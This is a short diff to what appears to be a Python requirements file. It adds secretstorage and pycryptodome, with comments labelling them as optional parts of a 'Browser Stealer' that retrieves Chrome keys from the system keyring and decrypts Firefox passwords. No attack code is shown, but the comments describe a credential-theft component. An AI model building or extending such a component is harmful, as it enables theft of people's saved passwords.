@@ -100,3 +100,9 @@ mouse==0.7.1
 
 # AI Advanced Intelligence (Memory, RAG, Vector Store)
 chromadb==1.5.9
+
+# Optional: Browser Stealer — Chrome v80+ key retrieval via system keyring
+secretstorage>=3.3.3
+
+# Optional: Browser Stealer — Firefox password decryption
+pycryptodome>=3.21.0
